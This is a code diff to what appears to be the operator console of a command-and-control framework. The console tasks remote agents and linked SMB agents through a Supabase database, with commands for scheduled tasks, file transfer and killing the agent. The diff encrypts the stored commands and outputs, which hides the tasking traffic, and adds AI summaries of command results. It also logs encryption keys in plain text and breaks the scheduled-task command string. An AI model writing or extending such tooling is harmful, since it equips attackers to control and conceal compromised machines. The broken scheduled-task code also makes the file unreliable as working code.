@@ -3,11 +3,14 @@ import itertools
 import os
 import threading
 import shlex
+from cryptography.fernet import Fernet
+import logging
 
 from .database import supabase, get_public_url
 from .download import download_file
 from .upload import upload_file
 from .ai_summary import generate_summary  # Import the new AI summary module
+from .encryption_utils import fetch_agent_info_by_hostname, encrypt_response, decrypt_output
 
 # Spinner for visual feedback
 spinner = itertools.cycle(['|', '/', '-', '\\'])
@@ -24,24 +27,51 @@ RESET = '\033[0m'
 # Add a global setting to toggle AI summary
 AI_SUMMARY = True
 
-def fetch_agent_id_by_hostname(hostname):
-    """Fetch the agent_id using hostname from the settings table."""
+def fetch_agent_info_by_hostname(hostname):
+    """Fetch the agent_id and encryption key using hostname from the settings table."""
     try:
-        response = supabase.table('settings').select('agent_id').eq('hostname', hostname).execute()
+        response = supabase.table('settings').select('agent_id', 'encryption_key').eq('hostname', hostname).execute()
         if response.data:
-            return response.data[0]['agent_id']
+            agent_info = response.data[0]
+            encryption_key = agent_info.get('encryption_key')
+            if encryption_key:
+                encryption_key = encryption_key.encode()
+            return agent_info['agent_id'], encryption_key
         else:
             print(f"{RED}Error:{RESET} No agent_id found for hostname: {hostname}")
-            return None
+            return None, None
     except Exception as e:
-        print(f"{RED}Error:{RESET} An error occurred while fetching agent_id for hostname {hostname}: {e}")
-        return None
+        print(f"{RED}Error:{RESET} An error occurred while fetching agent info for hostname {hostname}: {e}")
+        return None, None
 
+def decrypt_output(encrypted_output, key):
+    try:
+        logging.info(f"Decrypting output using key: {key}")
+        cipher_suite = Fernet(key)
+        decrypted_data = cipher_suite.decrypt(encrypted_output.encode()).decode()
+        logging.info(f"Decrypted output: {decrypted_data}")
+        return decrypted_data
+    except Exception as e:
+        logging.error(f"Failed to decrypt output: {e}")
+        return f"Failed to decrypt output: {e}"
+
+def encrypt_response(response, key):
+    try:
+        logging.info(f"Encrypting response using key: {key}")
+        cipher_suite = Fernet(key)
+        encrypted_data = cipher_suite.encrypt(response.encode()).decode()
+        logging.info(f"Encrypted response: {encrypted_data}")
+        return encrypted_data
+    except Exception as e:
+        logging.error(f"Failed to encrypt response: {e}")
+        return f"Failed to encrypt response: {e}"
 
 def view_command_history(hostname, search_term=None):
     """Fetch and display the command history for a specific host and its SMB agents, optionally filtering by a search term."""
     try:
-        print(f"{GREEN}Fetching command history for hostname: {hostname} with search term: {search_term}{RESET}")
+        print(f"{GREEN}Fetching command history for hostname: {hostname}{RESET}")
+        if search_term:
+            print(f"Filtering with search term: {search_term}")
 
         # Fetch all command history
         response = supabase.table('py2').select(
@@ -55,6 +85,20 @@ def view_command_history(hostname, search_term=None):
         if not commands:
             print(f"\n{YELLOW}No command history available for {hostname}.{RESET}")
             return
+
+        # Fetch encryption key for decryption
+        _, encryption_key = fetch_agent_info_by_hostname(hostname)
+
+        # Decrypt the output if encryption key is available
+        for command in commands:
+            if encryption_key:
+                try:
+                    command['output'] = decrypt_output(command['output'], encryption_key)
+                    command['command'] = decrypt_output(command['command'], encryption_key)
+                    if command['ai_summary']:
+                        command['ai_summary'] = decrypt_output(command['ai_summary'], encryption_key)
+                except Exception as e:
+                    print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")
 
         # Filter commands locally if search_term is provided
         if search_term:
@@ -94,6 +138,17 @@ def view_command_history(hostname, search_term=None):
     except Exception as e:
         print(f"{RED}Error:{RESET} An error occurred while fetching command history: {e}")
 
+def handle_view_history_command(command_text, hostname):
+    """Handle the 'view_history' and 'view_history grep' commands."""
+    parts = command_text.split(maxsplit=2)
+    if len(parts) == 2:
+        view_command_history(hostname)
+    elif len(parts) == 3 and parts[1] == 'grep':
+        search_term = parts[2]
+        view_command_history(hostname, search_term)
+    else:
+        print(f"{RED}Error:{RESET} Invalid view_history command format. Use 'view_history' or 'view_history grep <search_term>'.")
+
 def file_exists_in_supabase(bucket_name, storage_path):
     folder_path = os.path.dirname(storage_path)
     response = supabase.storage.from_(bucket_name).list(folder_path)
@@ -103,13 +158,22 @@ def file_exists_in_supabase(bucket_name, storage_path):
                 return True
     return False
 
-def check_for_completed_commands(command_id, agent_id, printed_flag, smbhost):
+def check_for_completed_commands(command_id, agent_id, encryption_key, printed_flag, smbhost):
     response = supabase.table('py2').select('status', 'command', 'output').eq('id', command_id).execute()
     command_info = response.data[0]
     if command_info['status'] in ('Completed', 'Failed'):
         if not printed_flag.is_set():
             output = command_info.get('output', 'No output available')
             cmd = command_info.get('command', 'No command available')
+
+            # Decrypt the output if encryption key is available
+            if encryption_key:
+                try:
+                    output = decrypt_output(output, encryption_key)
+                except Exception as e:
+                    print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")
+                    output = "Failed to decrypt output."
+
             display_hostname = smbhost if smbhost else agent_id
             if command_info['status'] == 'Failed':
                 print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
@@ -120,20 +184,20 @@ def check_for_completed_commands(command_id, agent_id, printed_flag, smbhost):
             if AI_SUMMARY:
                 ai_summary = generate_summary(cmd, output)
                 if ai_summary:
+                    encrypted_summary = encrypt_response(ai_summary, encryption_key)
                     print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
-                    supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()
+                    supabase.table('py2').update({'ai_summary': encrypted_summary}).eq('id', command_id).execute()
 
             printed_flag.set()
         return True
     return False
 
-def background_check(command_id, agent_id, completed_event, printed_flag, smbhost):
+def background_check(command_id, agent_id, encryption_key, completed_event, printed_flag, smbhost):
     while not completed_event.is_set():
         time.sleep(10)
-        if check_for_completed_commands(command_id, agent_id, printed_flag, smbhost):
+        if check_for_completed_commands(command_id, agent_id, encryption_key, printed_flag, smbhost):
             completed_event.set()
             break
-
 
 def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
     linked_smb_ip = None
@@ -151,12 +215,11 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
     external_ip = supabase.table("settings").select("external_ip").eq("hostname", hostname).execute().data
     external_ip = external_ip[0].get('external_ip', 'unknown') if external_ip else 'unknown'
 
-    # Fetch the agent_id based on hostname
-    agent_response = supabase.table("settings").select("agent_id").eq("hostname", hostname).execute()
-    if not agent_response.data:
+    # Fetch the agent_id and encryption key based on hostname
+    agent_id, encryption_key = fetch_agent_info_by_hostname(hostname)
+    if not agent_id:
         print(f"{RED}Error:{RESET} Unable to find agent_id for hostname {hostname}.")
         return
-    agent_id = agent_response.data[0]["agent_id"]
 
     while True:
         prompt = get_prompt()
@@ -211,7 +274,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" get_scheduled_task_info <task_name> :: Retrieve information about a scheduled task")
             print(" start_scheduled_task <task_name> :: Start a scheduled task")
             print(" view_history                  :: View the command history for the current host")
-            print(" search_history <term>         :: Search the command history for the current host with a specific term")
+            print(" view_history grep <term>      :: Search the command history for the current host with a specific term")
             print(" kill                          :: Terminate the agent")
             print(" exit                          :: Return to main menu\n")
             continue
@@ -228,12 +291,12 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             view_command_history(hostname)
             continue
 
-        if command_text.startswith('search_history'):
-            parts = command_text.split(maxsplit=1)
+        if command_text.startswith('view_history grep'):
+            parts = command_text.split(maxsplit=2)
             if len(parts) == 1:
-                print(f"{RED}Error:{RESET} Invalid search_history command format. Use 'search_history <term>'.")
+                print(f"{RED}Error:{RESET} Invalid search_history command format. Use 'view_history grep <term>'.")
                 continue
-            search_term = parts[1]
+            search_term = parts[2]
             view_command_history(hostname, search_term)
             continue
 
@@ -553,7 +616,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             elif repeat_interval:
                 command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time} {repeat_interval}'
             else:
-                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time}'
+                command_text = f'create_scheduled_task {task_name} "{trigger_time}"'
 
         if linked_smb_ip and not command_text.startswith("link smb agent") and not command_text.startswith("unlink smb agent"):
             command_text = f"smb {command_text}"
@@ -597,11 +660,13 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 print(f"{RED}Error:{RESET} Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                 continue
 
+        encrypted_command_text = encrypt_response(command_text, encryption_key)
+
         result = supabase.table('py2').insert({
             'agent_id': agent_id,
             'hostname': hostname,  # Include hostname in the command record
             'username': username,
-            'command': command_text,
+            'command': encrypted_command_text,
             'status': 'Pending'
         }).execute()
 
@@ -615,7 +680,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
 
         completed_event = threading.Event()
         printed_flag = threading.Event()
-        threading.Thread(target=background_check, args=(command_id, hostname, completed_event, printed_flag, smb_hostname), daemon=True).start()
+        threading.Thread(target=background_check, args=(command_id, hostname, encryption_key, completed_event, printed_flag, smb_hostname), daemon=True).start()
 
         first_pass = True
         start_time = time.time()
@@ -644,6 +709,16 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                     smb_hostname = command_info.get('smbhost', smb_hostname)
                     output = command_info.get('output', 'No output available')
                     cmd = command_info.get('command', 'No command available')
+
+                    # Decrypt the output if encryption key is available
+                    if encryption_key:
+                        try:
+                            output = decrypt_output(output, encryption_key)
+                            cmd = decrypt_output(cmd, encryption_key)
+                        except Exception as e:
+                            print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")
+                            output = "Failed to decrypt output."
+
                     display_hostname = smb_hostname if smb_hostname else hostname
                     if command_info['status'] == 'Failed':
                         print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
@@ -654,8 +729,9 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                     if AI_SUMMARY:
                         ai_summary = generate_summary(cmd, output)
                         if ai_summary:
+                            encrypted_summary = encrypt_response(ai_summary, encryption_key)
                             print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
-                            supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()
+                            supabase.table('py2').update({'ai_summary': encrypted_summary}).eq('id', command_id).execute()
 
                     printed_flag.set()
                 break
